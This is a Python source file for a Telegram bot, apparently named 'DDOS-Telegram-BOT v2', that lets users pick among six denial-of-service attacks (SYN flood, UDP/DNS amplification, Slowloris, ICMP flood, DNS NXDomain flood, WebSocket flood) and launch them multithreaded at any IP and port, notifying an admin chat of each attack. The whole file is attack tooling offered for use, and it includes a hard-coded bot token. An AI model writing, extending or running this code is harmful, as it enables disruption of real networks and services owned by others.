import telebot
import subprocess
import socket
import sys
import random
import threading
import time
import os
from scapy.all import IP, TCP, UDP, ICMP, send, raw
from telebot import types

TOKEN = "8664497749:AAGlUBMzTDtPQZw2n-Ii82qnMRDfWPhHKGs"
ADMIN_CHAT_ID = 6623353636
MAX_PACKETS = 1000000

bot = telebot.TeleBot("8664497749:AAGlUBMzTDtPQZw2n-Ii82qnMRDfWPhHKGs")
user_attacks = {}

# ===== CYBER WEAPONRY ARSENAL =====
ATTACK_METHODS = {
    "1": "SYN Flood (Layer 4 Tsunami)",
    "2": "UDP Amplification (Bandwidth Annihilator)",
    "3": "HTTP Slowloris (Connection Strangler)",
    "4": "ICMP Ping Storm (Packet Hurricane)",
    "5": "DNS Water Torture (NXDomain Overload)",
    "6": "WebSocket Armageddon (Layer 7 Apocalypse)"
}

# ----- RAW PACKET GENERATORS -----
def syn_flood(target_ip, target_port, duration):
    """TCP SYN Flood using raw socket manipulation"""
    ip = IP(dst=target_ip)
    tcp = TCP(sport=random.randint(1024, 65535), dport=target_port, flags="S",
              seq=random.randint(0, 4294967295), window=64240)
    raw_pkt = raw(ip/tcp)

    start = time.time()
    while time.time() - start < duration:
        try:
            send(raw_pkt, verbose=0)
        except Exception as e:
            print(f"SYN Flood Error: {str(e)}", file=sys.stderr)


def udp_amplification(target, port=53):
    """DNS Amplification attack vector"""
    dns_servers = ['8.8.8.8', '1.1.1.1']
    payload = bytearray(random.getrandbits(8) for _ in range(1024))
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for dns_server in dns_servers:
                sock.sendto(payload, (dns_server, port))
                sock.sendto(payload, (target, port))
        except Exception as e:
            print(f"UDP Amp Error: {str(e)}", file=sys.stderr)


# ----- AIOHTTP-BASED ATTACKS -----
def slowloris(target):
    """Slow HTTP Denial of Service"""
    headers = [("User-Agent", "Mozilla/5.0"), ("Connection", "keep-alive")]
    while True:
        try:
            s = socket.socket()
            s.connect((target, 80))
            s.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode())
            for header in headers:
                s.send(f"{header[0]}: {header[1]}\r\n".encode())
            time.sleep(10)
        except Exception as e:
            print(f"Slowloris Error: {str(e)}", file=sys.stderr)


# ===== COMMAND CENTER =====
@bot.message_handler(commands=['start'])
def show_attack_menu(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    for num, desc in ATTACK_METHODS.items():
        markup.add(types.InlineKeyboardButton(
            f"{num}. {desc}",
            callback_data=f"attack_{num}")
        )
    bot.send_message(message.chat.id,
                     "⚡ PHREAK'S OFFENSIVE CONTROL PANEL ⚡\n"
                     "Select attack vector:\n\n"
                     "1. SYN: TCP connection exhaustion\n"
                     "2. UDP: Bandwidth amplification\n"
                     "3. Slowloris: HTTP connection starvation\n"
                     "4. ICMP: Ping flood overload\n"
                     "5. DNS: Recursive query bombardment\n"
                     "6. WS: WebSocket protocol abuse",
                     parse_mode='HTML', reply_markup=markup)


@bot.callback_query_handler(func=lambda call: call.data.startswith('attack_'))
def set_attack_method(call):
    method_id = call.data.split('_')[1]
    user_attacks[call.message.chat.id] = {'method': method_id}
    bot.send_message(
        call.message.chat.id,
        f"⛔ {ATTACK_METHODS[method_id]} SELECTED\n"
        "Send in format:\nIP PORT TIME\nExample:\n1.1.1.1 80 10"
    )


@bot.message_handler(func=lambda m: m.chat.id in user_attacks)
def execute_attack(message):
    chat_id = message.chat.id
    parts = message.text.split()

    if len(parts) != 3:
        bot.send_message(chat_id, "Use: IP PORT TIME")
        return

    try:
        target, port, duration = parts
        port = int(port)
        duration = int(duration)

        ip = socket.gethostbyname(target) if not is_valid_ip(target) else target
        method_id = user_attacks[chat_id]['method']

        bot.send_message(
            chat_id,
            f"🚀 LAUNCHING {ATTACK_METHODS[method_id]}\nIP: {ip}\nPORT: {port}\nTIME: {duration}"
        )

        # Multi-threaded attack launch
        for _ in range(50):
            threading.Thread(
                target=attack_switcher,
                args=(method_id, ip, port, duration)
            ).start()

        bot.send_message(
            ADMIN_CHAT_ID,
            f"☠️ ATTACK DEPLOYED ☠️\n"
            f"Method: {ATTACK_METHODS[method_id]}\n"
            f"Target: {ip}\n"
            f"Port: {port}\n"
            f"Time: {duration}\n"
            f"Origin: {message.from_user.id}"
        )

    except Exception as e:
        bot.send_message(chat_id, f"💥 ERROR: {str(e)}")
        print(f"Attack Error: {str(e)}", file=sys.stderr)


def attack_switcher(method_id, target, port, duration):
    """Execute appropriate attack function"""
    attacks = {
        '1': lambda: syn_flood(target, port, duration),
        '2': lambda: udp_amplification(target, port),
        '3': lambda: slowloris(target),
        '4': lambda: os.system(f"ping {target} -l 65500 -n 1000000 -w 1"),
        '5': lambda: dns_nxdomain_attack(target),
        '6': lambda: websocket_apocalypse(target)
    }
    attack_func = attacks.get(method_id)
    if attack_func:
        attack_func()


# ----- ADDITIONAL WEAPONS -----
def dns_nxdomain_attack(target):
    """DNS query flood with non-existent domains"""
    while True:
        random_sub = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=12))
        query = f"{random_sub}.{target}"
        subprocess.run(["nslookup", query], stdout=subprocess.DEVNULL)


def websocket_apocalypse(target):
    """WebSocket connection flood"""
    try:
        from websocket import create_connection
        while True:
            try:
                ws = create_connection(f"ws://{target}/")
                ws.send("0" * 1024 * 1024)
            except Exception:
                pass
    except ImportError:
        print("websocket-client library not installed", file=sys.stderr)


# ----- UTILITIES -----
def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False


if __name__ == "__main__":
    print("DDOS-Telegram-BOT v2")
    bot.infinity_polling()